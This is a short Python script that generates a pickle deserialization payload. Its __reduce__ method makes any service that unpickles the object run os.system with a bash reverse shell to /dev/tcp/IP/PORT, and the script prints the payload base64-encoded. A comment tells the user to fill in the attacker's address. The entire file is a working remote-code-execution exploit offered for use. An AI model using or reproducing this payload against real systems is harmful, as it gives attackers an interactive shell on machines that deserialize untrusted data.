import pickle
import base64

# Exploit object
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, (f'bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"',),) # Change ip and port

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload)